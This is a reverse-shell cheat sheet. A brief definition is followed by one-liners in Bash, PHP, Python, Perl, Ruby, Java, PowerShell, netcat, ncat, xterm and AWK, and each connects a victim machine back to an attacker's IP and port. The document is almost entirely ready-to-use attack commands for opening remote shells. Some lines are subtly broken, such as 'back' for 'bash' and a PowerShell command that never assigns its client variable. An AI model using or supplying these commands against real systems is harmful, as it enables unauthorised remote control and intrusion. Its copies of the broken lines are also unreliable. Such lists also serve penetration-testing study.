Reverse Shell
  A reverse shell is a session initiated from a remote or victum machine back to the attacker. The attacker needs to have something listening on the appropriate port prior to initiating the reverse shell, or the connection will be refused/fail to connect. Each of the below are based on a linux/unix system (this is why /bin/sh -i is used) for a windows system you can substitute /bin/sh (or /bin/bash) for cmd.exe.

Bash Reverse Shell
  back -i >& /dev/tcp/<ip_addr>/<port> 0>&1

PHP Reverse Shell
  php -r '$sock=fsockopen("<ip-addr>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

Python Reverse
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip-addr>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Perl Reverse
  perl -MIO -e '$c=new IO::Socket::INET(<PeerAddr>,"<ip-addr>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

Ruby Reverse
  ruby -rsocket -e'f=TCPSocket.open("<ip-addr>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Java Reveres
r = Runtime.getRuntime()
p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/<ip-addr>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

Power-Shell Reverse
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ip_addr",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Netcat Reverse
  nc  <ip-addr> <port> -e /bin/sh

Ncat Reverse
  ncat <ip-addr> <port> -e /bin/bash

xTerm Reverse
  xterm -display <ip_addr>:<port>

AWK Reverse
  awk 'BEGIN {s = "/inet/tcp/0/<ip_addr>/<port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
